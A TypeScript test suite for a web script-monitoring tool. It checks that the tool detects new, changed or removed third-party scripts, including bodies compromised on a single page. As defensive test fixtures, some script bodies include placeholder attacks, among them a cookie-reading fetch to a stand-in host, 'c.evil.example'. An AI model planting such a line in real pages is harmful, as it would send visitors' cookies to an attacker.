import { mkdtemp, rm } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import { parseConfig } from '../src/config.js';
import { variantKey, type CapturedScript, type CrawlResult } from '../src/crawl.js';
import { applyCrawl } from '../src/detect.js';
import { scriptKey, sha256 } from '../src/script-key.js';
import { DataStore, emptyState, reviewKeyFor, type State } from '../src/state.js';

const HOME = 'https://www.example.com/';
const ARTICLE = 'https://www.example.com/article';

const config = parseConfig({
  pages: [HOME, ARTICLE],
  hosts: { quiet: ['*.ads.example'], ignoreContentChanges: ['https://dyn.example/*'] },
  retention: { scriptDays: 7 },
});

interface Load {
  url: string;
  body: string;
  pages?: string[];
}

function crawlOf(loads: Load[], errors: Record<string, string> = {}): CrawlResult {
  const scripts = new Map<string, CapturedScript>();
  for (const load of loads) {
    const first = scripts.get(load.url);
    scripts.set(first ? variantKey(load.url, sha256(load.body)) : load.url, {
      url: load.url,
      key: scriptKey(load.url),
      host: new URL(load.url).hostname,
      body: Buffer.from(load.body),
      sha256: sha256(load.body),
      pages: new Set(load.pages ?? [HOME]),
    });
  }
  return {
    startedAt: '',
    finishedAt: '',
    scripts,
    consentConfigured: false,
    consentAccepted: false,
    pages: [HOME, ARTICLE].map((page) => ({
      url: page,
      name: page,
      scannedAt: '2026-11-20T10:00:00.000Z',
      scriptUrls: loads.filter((load) => (load.pages ?? [HOME]).includes(page)).map((l) => l.url),
      ...(errors[page] ? { error: errors[page] } : {}),
    })),
  };
}

const day = (n: number) => new Date(Date.UTC(2026, 10, n, 10));

describe('applyCrawl', () => {
  let dir: string;
  let store: DataStore;
  let state: State;

  const run = async (loads: Load[], date: Date, errors?: Record<string, string>) => {
    const detection = await applyCrawl(state, crawlOf(loads, errors), config, store, date);
    state.runs++;
    return detection;
  };

  beforeEach(async () => {
    dir = await mkdtemp(join(tmpdir(), 'script-auditor-'));
    store = new DataStore(dir);
    state = emptyState(day(1));
  });

  afterEach(async () => {
    await rm(dir, { recursive: true, force: true });
  });

  it('records the first run as baseline without changes', async () => {
    const detection = await run(
      [
        { url: 'https://cdn.vendor.example/a.js?v=1', body: 'a1', pages: [HOME, ARTICLE] },
        { url: 'https://tag.other.example/t.js', body: 't1' },
      ],
      day(1),
    );
    expect(detection).toMatchObject({ baseline: true, changes: [], newHosts: [] });
    expect(Object.keys(state.scripts).sort()).toEqual([
      'https://cdn.vendor.example/a.js',
      'https://tag.other.example/t.js',
    ]);
    expect(state.scripts['https://cdn.vendor.example/a.js']!.pages).toEqual([HOME, ARTICLE]);
    expect(state.pages[ARTICLE]!.scriptKeys).toEqual(['https://cdn.vendor.example/a.js']);
    expect(state.history.map((event) => event.type)).toEqual(['baseline']);
    expect((await store.readBlob(sha256('t1')))?.toString()).toBe('t1');
  });

  it('reports new scripts, new hosts and real changes', async () => {
    await run(
      [
        { url: 'https://cdn.vendor.example/a.js', body: 'var a = 1; f("x")' },
        { url: 'https://tag.other.example/t.js', body: 't1' },
      ],
      day(1),
    );
    const detection = await run(
      [
        { url: 'https://cdn.vendor.example/a.js', body: 'var a = 1; f("x"); steal()' },
        { url: 'https://cdn.vendor.example/b.js', body: 'b1' },
        { url: 'https://new.host.example/n.js', body: 'n1' },
        { url: 'https://x.ads.example/bid.js', body: 'bid' },
        { url: 'https://tag.other.example/t.js', body: 't1' },
      ],
      day(2),
    );
    expect(detection.baseline).toBe(false);
    expect(detection.newHosts.sort()).toEqual(['new.host.example', 'x.ads.example']);
    const summary = detection.changes.map((change) => [
      change.kind,
      change.key,
      change.newHost,
      change.quietHost,
    ]);
    expect(summary).toEqual([
      ['changed', 'https://cdn.vendor.example/a.js', false, false],
      ['new', 'https://cdn.vendor.example/b.js', false, false],
      ['new', 'https://new.host.example/n.js', true, false],
      ['new', 'https://x.ads.example/bid.js', true, true],
    ]);
    expect(detection.changes[0]!.oldSha256).toBe(sha256('var a = 1; f("x")'));
    expect(state.scripts['https://cdn.vendor.example/a.js']!.versions).toHaveLength(2);
  });

  it('absorbs literal-only changes, ignored URLs and switches back to a known version', async () => {
    await run(
      [
        { url: 'https://cdn.vendor.example/c.js', body: 'init({ts:1795188732494})' },
        { url: 'https://dyn.example/x.js', body: 'anything' },
        { url: 'https://lb.example/v.js', body: 'upload("https://r.lb.example")' },
      ],
      day(1),
    );
    await run(
      [
        { url: 'https://cdn.vendor.example/c.js', body: 'init({ts:1795188744143})' },
        { url: 'https://dyn.example/x.js', body: 'something else entirely' },
        { url: 'https://lb.example/v.js', body: 'upload("https://g.lb.example")' },
      ],
      day(2),
    );
    const detection = await run(
      [
        { url: 'https://cdn.vendor.example/c.js', body: 'init({ts:1795188755555})' },
        { url: 'https://dyn.example/x.js', body: 'and again' },
        { url: 'https://lb.example/v.js', body: 'upload("https://r.lb.example")' },
      ],
      day(3),
    );
    expect(detection.changes).toEqual([]);
    expect(detection.absorbed).toBe(3);
    const literal = state.scripts['https://cdn.vendor.example/c.js']!;
    expect(literal.sha256).toBe(sha256('init({ts:1795188755555})'));
    expect(literal.versions).toHaveLength(1);
    expect(state.scripts['https://lb.example/v.js']!.versions).toHaveLength(2);
  });

  it('treats the return of a flagged version as a change', async () => {
    await run([{ url: 'https://cdn.vendor.example/a.js', body: 'good()' }], day(1));
    await run([{ url: 'https://cdn.vendor.example/a.js', body: 'evil()' }], day(2));
    const script = state.scripts['https://cdn.vendor.example/a.js']!;
    const flagged = script.versions.at(-1)!;
    flagged.reviewKey = reviewKeyFor(sha256('evil()'), sha256('good()'));
    state.reviews[flagged.reviewKey] = {
      verdict: 'malicious',
      confidence: 0.9,
      summary: '',
      reasons: [],
      provider: 'test',
      model: 'test',
      reviewedAt: '',
    };
    await run([{ url: 'https://cdn.vendor.example/a.js', body: 'good()' }], day(3));
    const detection = await run(
      [{ url: 'https://cdn.vendor.example/a.js', body: 'evil()' }],
      day(4),
    );
    expect(detection.changes.map((change) => change.kind)).toEqual(['changed']);
  });

  it('merges per-request variants of a script and forgets scripts no longer seen', async () => {
    await run(
      [
        { url: 'https://conv.example/p/?random=1', body: 'c1', pages: [HOME] },
        { url: 'https://conv.example/p/?random=2', body: 'c2', pages: [ARTICLE] },
        { url: 'https://old.example/gone.js', body: 'g' },
      ],
      day(1),
    );
    expect(state.scripts['https://conv.example/p/']!.pages).toEqual([HOME, ARTICLE]);
    await run([{ url: 'https://conv.example/p/?random=3', body: 'c1' }], day(5));
    expect(state.scripts['https://old.example/gone.js']).toBeDefined();
    const detection = await run([{ url: 'https://conv.example/p/?random=4', body: 'c1' }], day(9));
    expect(detection.removed).toEqual(['https://old.example/gone.js']);
    expect(state.history.at(-1)).toMatchObject({ type: 'removed', host: 'old.example' });
  });

  it('keeps page errors in the page record and the history', async () => {
    await run([], day(1), { [ARTICLE]: 'Error: HTTP 404' });
    expect(state.pages[ARTICLE]).toMatchObject({ error: 'Error: HTTP 404', scriptKeys: [] });
    expect(state.history.at(-1)).toMatchObject({ type: 'error', page: ARTICLE });
  });
  it('compares scripts generated per request leniently after the first time', async () => {
    const conversion = (title: string, n: number) => ({
      url: `https://conv.example/p/?random=${n}`,
      body: `track({title:"${title}",t:${n}})`,
    });
    await run([conversion('Home', 1)], day(1));
    // Two loads in one run that differ in more than numbers: generated per request
    const detection = await run(
      [
        { ...conversion('Home', 2), pages: [HOME] },
        { ...conversion('Article', 3), pages: [ARTICLE] },
      ],
      day(2),
    );
    // The run that first shows different bodies reviews the odd one: it could target a page
    expect(detection.changes).toMatchObject([{ kind: 'changed' }]);
    expect(state.scripts['https://conv.example/p/']!.perRequest).toBe(true);
    expect(state.history.some((event) => event.type === 'review-skipped')).toBe(true);
    const later = await run([conversion('Something else', 4)], day(3));
    expect(later.changes).toEqual([]);
    expect(later.absorbed).toBe(1);
  });

  // Earlier tests stopped here: once a script was marked per request, no change was ever
  // reviewed again, and only the first body of a run was looked at.
  it('still reviews a per-request script that adds a host or risky calls', async () => {
    const conversion = (title: string, n: number, extra = '') => ({
      url: `https://conv.example/p/?random=${n}`,
      body: `track({title:"${title}",t:${n}});${extra}`,
    });
    await run([conversion('Home', 1)], day(1));
    await run(
      [
        { ...conversion('Home', 2), pages: [HOME] },
        { ...conversion('Article', 3), pages: [ARTICLE] },
      ],
      day(2),
    );
    expect(state.scripts['https://conv.example/p/']!.perRequest).toBe(true);
    const detection = await run(
      [conversion('Home', 4, 'document.cookie;fetch("https://c.evil.example/x")')],
      day(3),
    );
    expect(detection.changes).toMatchObject([{ kind: 'changed', key: 'https://conv.example/p/' }]);
  });

  it('reviews again once several pages get the same body', async () => {
    const body = 'track({title:"same"})';
    await run([{ url: 'https://conv.example/p/', body: 'track({title:"a"})' }], day(1));
    await run(
      [
        { url: 'https://conv.example/p/?x=1', body: 'track({title:"b"})', pages: [HOME] },
        { url: 'https://conv.example/p/?x=2', body: 'track({title:"c"})', pages: [ARTICLE] },
      ],
      day(2),
    );
    expect(state.scripts['https://conv.example/p/']!.perRequest).toBe(true);
    await run([{ url: 'https://conv.example/p/', body, pages: [HOME, ARTICLE] }], day(3));
    expect(state.scripts['https://conv.example/p/']!.perRequest).toBeUndefined();
    const detection = await run(
      [{ url: 'https://conv.example/p/', body: 'track({title:"other"})', pages: [HOME, ARTICLE] }],
      day(4),
    );
    expect(detection.changes).toMatchObject([{ kind: 'changed' }]);
  });

  it('detects a compromised body served to one page only', async () => {
    const url = 'https://cdn.vendor.example/w.js';
    await run([{ url, body: 'widget()', pages: [HOME, ARTICLE] }], day(1));
    const detection = await run(
      [
        { url, body: 'widget()', pages: [HOME] },
        { url, body: 'widget();skim(document.forms)', pages: [ARTICLE] },
      ],
      day(2),
    );
    expect(detection.changes).toMatchObject([
      { kind: 'changed', newSha256: sha256('widget();skim(document.forms)') },
    ]);
  });
});
